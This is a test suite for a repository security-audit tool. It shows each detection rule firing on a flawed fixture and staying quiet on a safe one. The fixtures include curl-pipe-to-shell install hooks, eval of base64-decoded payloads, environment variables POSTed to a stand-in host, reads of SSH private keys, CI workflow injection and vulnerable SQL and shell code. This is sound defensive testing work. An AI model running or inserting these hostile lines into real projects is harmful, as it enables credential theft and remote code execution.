'use strict';

/*
 * The repository audit, rule by rule. Each rule is shown firing on the mistake
 * it names and staying quiet on the safe way to write the same thing -- a rule
 * that only ever fires is noise, and a rule tested only on the safe side has
 * never been seen to work.
 */

const assert = require('assert');
const audit = require('../src/code-audit');

function run(files, extra = {}) {
  return audit.analyse({ files, paths: extra.paths || files.map(file => file.path), registry: extra.registry });
}
function rules(result) {
  return result.findings.map(finding => `${finding.rule}@${finding.path || '-'}:${finding.line || '-'}`).sort();
}
function fires(label, files, expected, extra) {
  const result = run(files, extra);
  const found = result.findings.map(finding => finding.rule);
  for (const rule of expected) assert(found.includes(rule), `${label}: expected ${rule}, got ${rules(result).join(', ')}`);
  return result;
}
function quiet(label, files, forbidden, extra) {
  const result = run(files, extra);
  const found = result.findings.map(finding => finding.rule);
  for (const rule of forbidden) assert(!found.includes(rule), `${label}: ${rule} must not fire, got ${rules(result).join(', ')}`);
  return result;
}
/* Enough of an ordinary project that the hygiene rules have nothing to say. */
const BASE = [
  { path: 'README.md', text: '# App\n' },
  { path: '.gitignore', text: 'node_modules\n.env\n.env.*\n!.env.example\n' },
  { path: 'package-lock.json', text: '{}' },
  { path: 'test/app.test.js', text: 'test\n' }
];
const paths = files => [...BASE, ...files].map(file => file.path);

/* ---- Supply chain ---------------------------------------------------------- */
{
  const bad = [{ path: 'package.json', text: JSON.stringify({ name: 'x', scripts: { postinstall: 'curl -s https://example.test/p.sh | bash' }, dependencies: { a: '^1.0.0' } }, null, 2) }];
  const result = fires('install script', [...BASE, ...bad], ['SUP-001', 'SUP-002']);
  const finding = result.findings.find(item => item.rule === 'SUP-001');
  assert.strictEqual(finding.line, 4, 'the finding points at the script’s own line');
  assert.strictEqual(finding.severity, 'critical');
  quiet('build script', [...BASE, { path: 'package.json', text: JSON.stringify({ scripts: { postinstall: 'prisma generate', build: 'next build' } }) }], ['SUP-001', 'SUP-002']);

  fires('piped installer', [...BASE, { path: 'Dockerfile', text: 'FROM node:20.11.1\nRUN curl -fsSL https://example.test/setup | sh\n' }], ['SUP-002']);
  quiet('downloaded then verified', [...BASE, { path: 'Dockerfile', text: 'FROM node:20.11.1\nRUN curl -fsSLo setup.sh https://example.test/setup && sha256sum -c setup.sha256 && sh setup.sh\n' }], ['SUP-002']);

  fires('decoded and executed', [...BASE, { path: 'lib/x.js', text: 'eval(atob(payload));\n' }], ['SUP-003']);
  fires('python decoded exec', [...BASE, { path: 'x.py', text: 'exec(base64.b64decode(blob))\n' }], ['SUP-003']);
  quiet('decoding without executing', [...BASE, { path: 'lib/x.js', text: 'const data = JSON.parse(atob(payload));\n' }], ['SUP-003']);

  const blob = 'QUJD'.repeat(400);
  fires('embedded payload', [...BASE, { path: 'lib/p.js', text: `const p = "${blob}";\n` }], ['SUP-004']);
  quiet('inlined image', [...BASE, { path: 'lib/p.js', text: `const img = "data:image/png;base64,${blob}";\n` }], ['SUP-004']);

  fires('environment shipped out', [...BASE, { path: 'lib/t.js', text: 'const body = JSON.stringify(process.env);\nfetch("https://example.test", { method: "POST", body });\n' }], ['SUP-005']);
  fires('credential store read', [...BASE, { path: 'lib/t.js', text: 'const k = fs.readFileSync(os.homedir() + "/.ssh/id_rsa");\n' }], ['SUP-005']);
  quiet('environment read without sending', [...BASE, { path: 'lib/t.js', text: 'const port = process.env.PORT;\n' }], ['SUP-005']);

  fires('git dependency', [...BASE, { path: 'package.json', text: JSON.stringify({ dependencies: { thing: 'github:someone/thing' } }, null, 2) }], ['SUP-006']);
  quiet('workspace dependency', [...BASE, { path: 'package.json', text: JSON.stringify({ dependencies: { thing: 'workspace:*', other: 'file:../other' } }, null, 2) }], ['SUP-006', 'HYG-005']);

  /* Workflows: a privileged checkout of contributed code, event text in a script, a movable action. */
  const expr = inner => ['$', '{{ ', inner, ' }}'].join('');
  const privileged = [
    'on:', '  pull_request_target:', 'jobs:', '  label:', '    runs-on: ubuntu-latest', '    steps:',
    '      - uses: actions/checkout@v4', '        with:', `          ref: ${expr('github.event.pull_request.head.sha')}`,
    '      - run: npm ci && npm test', ''
  ].join('\n');
  const checkout = fires('privileged checkout', [...BASE, { path: '.github/workflows/label.yml', text: privileged }], ['SUP-007']);
  assert.strictEqual(checkout.findings.find(item => item.rule === 'SUP-007').line, 9, 'the finding points at the checkout of the head');
  quiet('unprivileged checkout of the head', [...BASE, { path: '.github/workflows/ci.yml', text: privileged.replace('pull_request_target', 'pull_request') }], ['SUP-007']);
  quiet('privileged job on the base', [...BASE, { path: '.github/workflows/label.yml', text: privileged.replace(/\s+with:\n.*\n/, '\n') }], ['SUP-007']);

  const injected = [
    'on: issues', 'jobs:', '  triage:', '    runs-on: ubuntu-latest', '    steps:',
    `      - run: echo "${expr('github.event.issue.title')}"`,
    '      - name: multi-line', '        run: |', '          echo start', `          echo "${expr('github.head_ref')}"`,
    '      - uses: actions/github-script@v7', '        with:', '          script: |', `            core.info("${expr('github.event.comment.body')}")`, ''
  ].join('\n');
  const injection = fires('event text in scripts', [...BASE, { path: '.github/workflows/triage.yml', text: injected }], ['SUP-009']);
  assert.deepStrictEqual(injection.findings.filter(item => item.rule === 'SUP-009').map(item => item.line), [6, 10, 14]);
  quiet('event text through the environment', [...BASE, { path: '.github/workflows/triage.yml', text: [
    'on: issues', 'jobs:', '  triage:', '    runs-on: ubuntu-latest', '    steps:',
    '      - env:', `          TITLE: ${expr('github.event.issue.title')}`, '        run: echo "$TITLE"',
    `      - if: ${expr("contains(github.event.issue.title, 'bug')")}`, '        run: echo bug',
    `      - run: echo "${expr('github.event.issue.number')}"`, ''
  ].join('\n') }], ['SUP-009']);

  const actions = [
    'on: push', 'jobs:', '  build:', '    runs-on: ubuntu-latest', '    steps:',
    '      - uses: actions/checkout@v4', '      - uses: github/codeql-action/init@v3',
    '      - uses: someone/deploy@v2', '      - uses: someone/tool@main', "      - uses: 'someone/quoted@v1'",
    '      - uses: someone/pinned@0123456789abcdef0123456789abcdef01234567 # v1.2.0', '      - uses: ./.github/actions/local',
    '      - uses: docker://alpine:3.20', '      - uses: docker://alpine@sha256:' + 'a'.repeat(64), ''
  ].join('\n');
  const movable = fires('movable actions', [...BASE, { path: '.github/workflows/build.yml', text: actions }], ['SUP-008']);
  assert.deepStrictEqual(movable.findings.filter(item => item.rule === 'SUP-008').map(item => item.line), [8, 9, 10, 13]);
  quiet('the same actions outside a workflow', [...BASE, { path: 'docs/example.yml', text: actions }], ['SUP-008']);
}

/*
 * ---- Text is not code ------------------------------------------------------
 *
 * A call named inside a string -- a message, a test fixture, a scanner's own
 * rule text -- is not the call. What a template's ${...} or an f-string's
 * {...} holds runs, so hiding a call there does not hide it.
 */
{
  const tpl = inner => ['`', '$', '{', inner, '}', '`'].join('');
  quiet('a call described in a string', [...BASE, { path: 'lib/x.js', text: 'const why = "never eval(atob(x)) here";\nconst tip = \'Math.random() tokens are guessable\';\n' }], ['SUP-003', 'SEC-005']);
  quiet('a fixture of a call', [...BASE, { path: 'lib/x.js', text: 'const sample = { text: \'db.query(`SELECT * FROM t WHERE id = ${id}`)\' };\n' }], ['SEC-001']);
  quiet('a public secret named in a message', [...BASE, { path: 'web/x.ts', text: 'throw new Error("process.env.NEXT_PUBLIC_API_SECRET must not be set");\n' }], ['SEC-006']);
  quiet('a credential path in a pattern', [...BASE, { path: 'lib/x.js', text: 'const store = /\\.ssh\\/id_rsa|Login Data/;\n' }], ['SUP-005']);
  quiet('an escaped f-string brace', [...BASE, { path: 'x.py', text: 'doc = f"{{exec(base64.b64decode(blob))}}"\n' }], ['SUP-003']);
  quiet('CORS options described in a string', [...BASE, { path: 'server.js', text: 'const doc = "cors({ origin: true, credentials: true })";\n' }], ['SEC-003']);

  fires('a call inside a template expression', [...BASE, { path: 'lib/x.js', text: `const s = ${tpl('eval(atob(p))')};\n` }], ['SUP-003']);
  fires('a call inside an f-string', [...BASE, { path: 'x.py', text: 'x = f"{exec(base64.b64decode(blob))}"\n' }], ['SUP-003']);
  fires('a call after a closed string', [...BASE, { path: 'lib/x.js', text: 'const s = "it\\"s"; eval(atob(p));\n' }], ['SUP-003']);
  fires('a call after a string holding the other quote', [...BASE, { path: 'lib/x.js', text: 'const q = "\'"; eval(atob(p));\n' }], ['SUP-003']);
  fires('a credential file named in a string', [...BASE, { path: 'lib/x.js', text: 'send(fs.readFileSync(home + "/.ssh/id_rsa"));\n' }], ['SUP-005']);
  fires('script in an HTML attribute', [...BASE, { path: 'index.html', text: '<a onclick="eval(atob(p))">x</a>\n' }], ['SUP-003']);
}

/* ---- Code security ----------------------------------------------------------- */
{
  fires('SQL template', [...BASE, { path: 'api/users.js', text: 'db.query(`SELECT * FROM users WHERE id = ${req.params.id}`);\n' }], ['SEC-001']);
  fires('SQL concat', [...BASE, { path: 'api/users.js', text: 'db.query("SELECT * FROM users WHERE id = " + id);\n' }], ['SEC-001']);
  fires('python f-string SQL', [...BASE, { path: 'app.py', text: 'cur.execute(f"SELECT * FROM users WHERE id = {uid}")\n' }], ['SEC-001']);
  quiet('parameterised SQL', [...BASE, { path: 'api/users.js', text: 'db.query("SELECT * FROM users WHERE id = $1", [id]);\nconst rows = await sql`SELECT * FROM users WHERE id = ${id}`;\n' }], ['SEC-001']);

  fires('untrusted innerHTML', [...BASE, { path: 'web/a.js', text: 'el.innerHTML = `<p>${comment.body}</p>`;\n' }], ['SEC-002']);
  fires('location into innerHTML', [...BASE, { path: 'web/a.js', text: 'out.innerHTML = location.hash;\n' }], ['SEC-002']);
  fires('React raw HTML', [...BASE, { path: 'web/a.jsx', text: '<div dangerouslySetInnerHTML={{ __html: post.html }} />\n' }], ['SEC-002']);
  quiet('escaped or constant markup', [...BASE, { path: 'web/a.js', text: 'el.innerHTML = `<p>${esc(comment.body)}</p>`;\nicon.innerHTML = `<svg>${ICONS.star}</svg>`;\nel.textContent = comment.body;\n<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.html) }} />\n' }], ['SEC-002']);

  fires('credentialed wildcard CORS', [...BASE, { path: 'server.js', text: 'app.use(cors({ origin: true, credentials: true }));\n' }], ['SEC-003']);
  quiet('allow-listed CORS', [...BASE, { path: 'server.js', text: 'app.use(cors({ origin: ["https://app.example.test"], credentials: true }));\n' }], ['SEC-003']);

  fires('insecure cookie', [...BASE, { path: 'server.js', text: 'res.cookie("session", token, { secure: false });\n' }], ['SEC-004']);
  quiet('hardened cookie', [...BASE, { path: 'server.js', text: 'res.cookie("session", token, { httpOnly: true, secure: true, sameSite: "lax" });\n' }], ['SEC-004']);

  fires('weak token randomness', [...BASE, { path: 'lib/t.js', text: 'const resetToken = Math.random().toString(36).slice(2);\n' }], ['SEC-005']);
  fires('python weak randomness', [...BASE, { path: 'lib/t.py', text: 'otp = random.randint(100000, 999999)\n' }], ['SEC-005']);
  quiet('crypto randomness and a jitter', [...BASE, { path: 'lib/t.js', text: 'const resetToken = crypto.randomUUID();\nconst delay = Math.random() * 100;\n' }], ['SEC-005']);

  fires('public secret in code', [...BASE, { path: 'web/pay.ts', text: 'const key = process.env.NEXT_PUBLIC_STRIPE_SECRET_KEY;\n' }], ['SEC-006']);
  fires('public secret in env example', [...BASE, { path: '.env.example', text: 'VITE_SUPABASE_SERVICE_ROLE_KEY=\n' }], ['SEC-006']);
  quiet('public keys that are meant to be public', [...BASE, { path: 'web/pay.ts', text: 'const a = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;\nconst b = process.env.STRIPE_SECRET_KEY;\nfail("PUBLIC_ALPHA_SECRET_MATERIAL");\n' }], ['SEC-006']);

  fires('unsigned webhook', [...BASE, { path: 'server.js', text: 'app.post("/api/stripe/webhook", express.json(), (req, res) => {\n  markPaid(req.body);\n});\n' }], ['SEC-007']);
  fires('unsigned Next webhook', [...BASE, { path: 'app/api/webhook/route.ts', text: 'export async function POST(req) {\n  const event = await req.json();\n}\n' }], ['SEC-007']);
  quiet('signed webhook', [...BASE, { path: 'server.js', text: 'app.post("/api/stripe/webhook", (req, res) => {\n  const event = stripe.webhooks.constructEvent(req.body, req.headers["stripe-signature"], secret);\n});\n' }], ['SEC-007']);

  fires('TLS off', [...BASE, { path: 'lib/h.js', text: 'const agent = new https.Agent({ rejectUnauthorized: false });\n' }], ['SEC-008']);
  fires('python TLS off', [...BASE, { path: 'lib/h.py', text: 'requests.get(url, verify=False)\n' }], ['SEC-008']);
  quiet('TLS on', [...BASE, { path: 'lib/h.js', text: 'const agent = new https.Agent({ ca: bundle });\n' }], ['SEC-008']);

  fires('alg none', [...BASE, { path: 'lib/j.js', text: 'jwt.verify(t, k, { algorithms: ["none"] });\n' }], ['SEC-009']);
  const decodeOnly = fires('decoded, never verified', [...BASE, { path: 'lib/j.js', text: 'const claims = jwt.decode(token);\n' }], ['SEC-009']);
  assert.strictEqual(decodeOnly.findings.find(item => item.rule === 'SEC-009').severity, 'warning', 'a decode alone is a warning: it may be for display');
  quiet('verified token', [...BASE, { path: 'lib/j.js', text: 'const claims = jwt.verify(token, key, { algorithms: ["HS256"] });\n' }], ['SEC-009']);

  fires('eval of a request', [...BASE, { path: 'api/calc.js', text: 'res.json(eval(req.body.expr));\n' }], ['SEC-010']);
  quiet('parse of a request', [...BASE, { path: 'api/calc.js', text: 'res.json(JSON.parse(req.body.expr));\n' }], ['SEC-010']);

  fires('shell interpolation', [...BASE, { path: 'api/zip.js', text: 'execSync(`zip -r out.zip ${req.query.dir}`);\n' }], ['SEC-011']);
  fires('python shell=True', [...BASE, { path: 'api/zip.py', text: 'subprocess.run(f"zip -r out.zip {d}", shell=True)\n' }], ['SEC-011']);
  quiet('argument array', [...BASE, { path: 'api/zip.js', text: 'execFileSync("zip", ["-r", "out.zip", dir]);\n' }], ['SEC-011']);

  fires('login without a limit', [...BASE, { path: 'server.js', text: 'app.post("/api/login", handler);\n' }], ['SEC-012']);
  quiet('login with a limit', [...BASE, { path: 'server.js', text: 'const limiter = rateLimit({ windowMs: 60000, max: 5 });\napp.post("/api/login", limiter, handler);\n' }], ['SEC-012']);

  fires('django debug', [...BASE, { path: 'site/settings.py', text: 'DEBUG = True\n' }], ['SEC-013']);
  quiet('debug from the environment', [...BASE, { path: 'site/settings.py', text: 'DEBUG = os.environ.get("DEBUG") == "1"\n' }], ['SEC-013']);

  /* Tests may do all of this on purpose, and are not the application. */
  quiet('tests are not the application', [...BASE, { path: 'test/sql.test.js', text: 'db.query(`SELECT * FROM ${table}`);\n' }], ['SEC-001']);
  /* A comment that names a pattern is not the pattern. */
  quiet('a comment', [...BASE, { path: 'lib/x.js', text: '// never do eval(atob(x)) here\n' }], ['SUP-003']);
}

/* ---- Dependencies ---------------------------------------------------------------- */
{
  const manifest = { path: 'package.json', text: JSON.stringify({ dependencies: { react: '^18.2.0', 'react-hooks-helperz': '^1.0.0', '@acme/internal': '^2.0.0', 'left-pad': '^1.3.0' } }, null, 2) };
  const registry = new Map([
    ['npm:react', 'exists'], ['npm:react-hooks-helperz', 'missing'], ['npm:@acme/internal', 'missing'], ['npm:left-pad', 'unknown']
  ]);
  const result = run([...BASE, manifest], { registry });
  const byRule = result.findings.filter(item => item.category === 'dependencies');
  assert.deepStrictEqual(byRule.map(item => item.rule).sort(), ['DEP-001', 'DEP-002']);
  assert.strictEqual(byRule.find(item => item.rule === 'DEP-001').line, manifest.text.split('\n').findIndex(line => line.includes('react-hooks-helperz')) + 1);
  assert.deepStrictEqual(result.dependencyStatus, { checked: 4, missing: 2, unknown: 1 }, 'an unreachable registry is unknown, never missing');

  const python = { path: 'requirements.txt', text: 'Flask==3.0.0\nrequests_toolbelt>=1\n# a comment\n-r other.txt\n' };
  const answers = new Map([['pypi:flask', 'exists'], ['pypi:requests-toolbelt', 'missing']]);
  const pythonResult = run([...BASE, python], { registry: answers });
  assert.deepStrictEqual(pythonResult.findings.filter(item => item.rule === 'DEP-001').map(item => item.line), [2], 'PyPI names are normalised before they are compared');

  assert.strictEqual(audit.registryUrl({ ecosystem: 'npm', name: '@acme/internal' }), 'https://registry.npmjs.org/@acme%2Finternal');
  assert.strictEqual(audit.registryUrl({ ecosystem: 'pypi', name: 'Requests_Toolbelt' }), 'https://pypi.org/pypi/requests-toolbelt/json');
}

/* ---- Hygiene ------------------------------------------------------------------ */
{
  const committed = fires('committed env', [{ path: 'README.md', text: '#' }, { path: '.env', text: 'X=1\n' }, { path: 'app.js', text: 'process.env.X\n' }], ['HYG-001', 'HYG-002']);
  assert.strictEqual(committed.findings.find(item => item.rule === 'HYG-001').severity, 'critical');
  quiet('env example only', [...BASE, { path: '.env.example', text: 'X=\n' }, { path: 'app.js', text: 'process.env.X\n' }], ['HYG-001', 'HYG-002']);

  const node = { path: 'package.json', text: JSON.stringify({ dependencies: { a: '*', b: 'latest', c: '^1.0.0' } }, null, 2) };
  fires('no lockfile and open versions', [{ path: 'README.md', text: '#' }, node], ['HYG-003', 'HYG-005']);
  fires('two lockfiles', [...BASE, node, { path: 'yarn.lock', text: '' }], ['HYG-004']);
  quiet('one lockfile', [...BASE, { path: 'package.json', text: JSON.stringify({ dependencies: { c: '^1.0.0' } }) }], ['HYG-003', 'HYG-004', 'HYG-005']);

  fires('unpinned images', [...BASE, { path: 'Dockerfile', text: 'FROM node\nFROM python:latest AS py\n' }], ['HYG-006']);
  quiet('pinned images and stages', [...BASE, { path: 'Dockerfile', text: 'FROM node:20.11.1 AS build\nFROM build\nFROM gcr.io/distroless/nodejs20-debian12@sha256:abc\nFROM scratch\n' }], ['HYG-006']);

  fires('strict off', [...BASE, { path: 'tsconfig.json', text: '{ "compilerOptions": { "strict": false } }' }], ['HYG-007']);
  quiet('strict on or inherited', [...BASE, { path: 'tsconfig.json', text: '{ "compilerOptions": { "strict": true } }' }, { path: 'web/tsconfig.json', text: '{ "extends": "../tsconfig.json" }' }], ['HYG-007']);

  const bare = run([{ path: 'a.js', text: '' }, { path: 'b.js', text: '' }, { path: 'c.js', text: '' }, { path: 'd.js', text: '' }, { path: 'e.js', text: '' }]);
  assert(bare.findings.some(item => item.rule === 'HYG-008') && bare.findings.some(item => item.rule === 'HYG-009'));
}

/* ---- Scoring, identity and what a finding carries ------------------------------ */
{
  const clean = run(BASE);
  assert.strictEqual(clean.score, 100);
  assert.strictEqual(clean.grade, 'A');
  assert.strictEqual(clean.capped, false);

  const critical = run([...BASE, { path: 'api/users.js', text: 'db.query(`SELECT * FROM users WHERE id = ${id}`);\n' }]);
  assert(critical.score <= audit.CRITICAL_CAP, 'a critical finding holds the grade below the cap');
  assert.strictEqual(critical.grade, 'F');
  assert.strictEqual(critical.capped, true);

  /* One rule firing thirty times is one problem, not thirty. */
  const many = run([...BASE, { path: 'lib/t.js', text: 'const agent = new https.Agent({ rejectUnauthorized: false });\n'.repeat(30) }]);
  const code = many.categories.find(category => category.id === 'code');
  assert.strictEqual(code.counts.serious, 30);
  assert.strictEqual(code.score, 100 - audit.SEVERITY_PENALTY.serious * 2);

  /* A finding names a place and never quotes it. */
  const secretLine = 'const resetToken = Math.random().toString(36).slice(2); // hunter2-canary';
  const quoted = run([...BASE, { path: 'lib/t.js', text: `${secretLine}\n` }]);
  const serialized = JSON.stringify(quoted);
  assert(!serialized.includes('hunter2-canary') && !serialized.includes('toString(36)'), 'no source text leaves the audit');
  const prompt = quoted.findings[0].prompt;
  assert.match(prompt, /^In lib\/t\.js \(line 1\): /);
  assert.match(prompt, /add or update a test that fails before the fix/);

  /* Identity is stable across runs and moves only with the rule, the file or the occurrence. */
  const again = run([...BASE, { path: 'lib/t.js', text: `\n\n${secretLine}\n` }]);
  assert.strictEqual(again.findings[0].id, quoted.findings[0].id, 'a finding keeps its identity when lines move');
}

/* ---- Selection -------------------------------------------------------------------- */
{
  const entries = [
    { path: 'node_modules/x/index.js', size: 10 }, { path: 'dist/app.js', size: 10 }, { path: 'public/app.min.js', size: 10 },
    { path: 'src/app.ts', size: 10 }, { path: 'package.json', size: 10 }, { path: 'big.js', size: audit.LIMITS.maxFileBytes + 1 },
    { path: 'logo.png', size: 10 }, { path: 'package-lock.json', size: 10 }
  ].map(entry => ({ ...entry, sha: 'a'.repeat(40) }));
  const selection = audit.selectFiles(entries);
  assert.deepStrictEqual(selection.selected.map(entry => entry.path), ['package.json', 'src/app.ts'], 'manifests first, then source; vendored, built and minified code is not the application');
  assert.deepStrictEqual(selection.skipped, { excluded: 3, oversize: 1, budget: 0 });
  const tight = audit.selectFiles(entries, { ...audit.LIMITS, maxFiles: 1 });
  assert.strictEqual(tight.skipped.budget, 1, 'what the budget left unread is counted, so coverage can say so');
}

/* ---- The whole audit against a reader and a registry ------------------------------ */
(async () => {
  const files = new Map([
    ['README.md', '# app\n'],
    ['package.json', JSON.stringify({ dependencies: { express: '^4.19.0', 'expresss-safe-router': '^1.0.0' } }, null, 2)],
    ['package-lock.json', '{}'],
    ['server.js', 'app.post("/api/login", handler);\n'],
    ['test/a.test.js', '']
  ]);
  const reader = {
    resolveCommit: async ({ ref }) => ({ ref, commitSha: 'c'.repeat(40) }),
    readTree: async () => ({
      truncated: false,
      skipped: [{ path: 'logo.png', reason: 'binary', sha: null }],
      entries: [...files.keys()].map(path => ({ path, sha: Buffer.from(path).toString('hex').padEnd(40, '0').slice(0, 40), size: files.get(path).length }))
    }),
    readBlob: async ({ sha }) => {
      const path = [...files.keys()].find(candidate => Buffer.from(candidate).toString('hex').padEnd(40, '0').slice(0, 40) === sha);
      return { text: files.get(path), skip: null };
    }
  };
  const asked = [];
  const registryTransport = async input => {
    asked.push(input);
    if (input.url.includes('expresss-safe-router')) return { statusCode: 404 };
    return { statusCode: 200 };
  };
  const result = await audit.auditRepository({ reader, scope: { provider: 'github', owner: 'a', repo: 'b' }, ref: 'main', token: 't', transport: null, registryTransport });
  assert.strictEqual(result.commitSha, 'c'.repeat(40));
  assert.deepStrictEqual(result.findings.map(item => item.rule).sort(), ['DEP-001', 'SEC-012']);
  assert.strictEqual(result.coverage.read, 3, 'the README and the lockfile are looked for, not read');
  assert.strictEqual(result.coverage.complete, true);
  assert.deepStrictEqual(result.coverage.packages, { declared: 2, checked: 2, unknown: 0, notChecked: 0 });
  assert(asked.every(input => input.method === 'HEAD' && input.profile === 'provider-read'), 'registries are asked with HEAD through the guarded profile');

  /* A registry that cannot be reached leaves the package unknown, and says so. */
  const offline = await audit.auditRepository({ reader, scope: { provider: 'github', owner: 'a', repo: 'b' }, ref: 'main', token: 't', transport: null,
    registryTransport: async () => { throw new Error('down'); } });
  assert(!offline.findings.some(item => item.category === 'dependencies'));
  assert.strictEqual(offline.coverage.packages.unknown, 2);

  console.log('code audit tests passed');
})().catch(error => {
  console.error(error && error.stack || error);
  process.exitCode = 1;
});
